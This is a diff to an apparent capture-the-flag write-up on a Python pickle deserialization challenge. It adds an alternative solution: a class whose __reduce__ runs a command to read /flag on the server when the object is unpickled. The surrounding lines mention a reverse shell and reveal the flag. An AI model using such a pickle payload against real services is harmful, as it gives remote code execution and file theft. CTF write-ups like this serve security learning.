@@ -93,8 +93,18 @@ Reverse shell spawned! The flag is inside <code>/flag</code>.
 
 Flag is <code>RS{TH3_L345T_53CUR3_P1CKL3}</code>.
 
+## Other solutions
 
+A less complicated way to solve the challenge was to pickle an instance of the following class:
 
+```python
+class RCE:
+    def __reduce__(self):
+        return (subprocess.check_output,(["cat","/flag"],))
+```
+The flag would have been printed within the <code>/order</code> page:
+
+![image](https://user-images.githubusercontent.com/66698256/229546319-49b8a02e-68f8-49b9-af3e-fe714244bb7c.png)
 
 ## References
 <a id="1">[1]</a> 
